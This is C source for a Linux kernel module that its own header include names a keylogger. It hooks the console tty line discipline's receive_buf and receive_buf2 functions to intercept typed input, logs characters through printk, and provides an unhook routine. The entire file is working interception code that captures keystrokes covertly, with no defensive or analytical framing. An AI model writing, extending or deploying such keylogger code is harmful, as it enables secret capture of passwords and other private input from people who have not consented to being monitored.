#include <linux/tty.h>
#include <linux/slab.h>
#include <linux/file.h>

#include "keylogger.h"

#define MAX_TTY_CON 1

void (*old_receive_buf)(struct tty_struct *, const unsigned char *,
      char *, int);
int (*old_receive_buf2)(struct tty_struct *, const unsigned char *,
      char *, int);

struct tlogger {
  struct tty_struct *tty;
  int status;
};

struct tlogger *ttys[MAX_TTY_CON] = { NULL };

void new_receive_buf(struct tty_struct *tty, const unsigned char *buf,
      char *flags, int count)
{
	DBG("%s\n", __func__);

	if ((tty->driver->flags != TTY_DRIVER_REAL_RAW) && buf)
		printk("First char: %c (%x), count %d", buf[0], buf[0], count);
	old_receive_buf(tty, buf, flags, count);
}

int new_receive_buf2(struct tty_struct *tty, const unsigned char *buf,
      char *flags, int count)
{
	DBG("%s\n", __func__);

	if(tty->driver->flags != TTY_DRIVER_REAL_RAW)
		printk("First char: %c (%x), count %d", buf[0], buf[0], count);
	return old_receive_buf2(tty, buf, flags, count);
}

int init_tty(struct tty_struct *tty, int tty_index)
{
	struct tlogger *tmp;

	DBG("Init logging for /dev/tty%d", tty_index);

	if (ttys[tty_index] == NULL) {
		tmp = kmalloc(sizeof(struct tlogger), GFP_KERNEL);
		if(!tmp) {
			printk("kmalloc failed\n");
			return -ENOMEM;
		}
		memset(tmp, 0, sizeof(struct tlogger));
		tmp->tty = tty;
		tty->ldisc->ops->receive_buf = new_receive_buf;
		tty->ldisc->ops->receive_buf2 = new_receive_buf2;
		ttys[tty_index] = tmp;
	} else {
		tmp = ttys[tty_index];
		tty->ldisc->ops->receive_buf = new_receive_buf;
		tty->ldisc->ops->receive_buf2 = new_receive_buf2;
	}
	return 0;
}

int tty_hook(void)
{
	int i, ret = 0;
	static int fl = 0;
	struct file *file;
	struct tty_struct *tty;
	char dev_name[60];

	DBG("%s", __func__);

	for(i=0; i<MAX_TTY_CON; i++) {
		snprintf(dev_name, sizeof(dev_name), "/dev/tty%d", i);
		DBG("Opening %s", dev_name);
		file = filp_open(dev_name, O_RDONLY, 0);
		if (file < 0) {
			printk("Could not open /dev/tty%d", i);
			continue;
		}
		get_file(file);
		tty = ((struct tty_file_private *)file->private_data)->tty;
		if(tty->driver->type != TTY_DRIVER_TYPE_CONSOLE) {
			printk("Not a console");
		}
		DBG("driver type %d", tty->driver->type );
		DBG("%p", tty->ldisc );
		DBG("ops %p",tty->ldisc->ops);
		DBG("ldisc %p", tty->ldisc->ops->receive_buf);
		if (tty && tty->ldisc && tty->ldisc->ops && !fl) {
			fl = 1;
			if (tty->ldisc->ops->receive_buf) {
				old_receive_buf = tty->ldisc->ops->receive_buf;
			}
			if (tty->ldisc->ops->receive_buf2) {
				old_receive_buf2 = tty->ldisc->ops->receive_buf2;
			}
			ret = init_tty(tty, tty->index);
		}
		fput(file);
		filp_close(file, NULL);
	}
	return ret;
}

void tty_unhook(void)
{
	int i;

	DBG("%s", __func__);

	for(i=0; i<MAX_TTY_CON; i++) {
		if (ttys[i] != NULL) {
			ttys[i]->tty->ldisc->ops->receive_buf = old_receive_buf;
			ttys[i]->tty->ldisc->ops->receive_buf2 = old_receive_buf2;
		}
	}
}
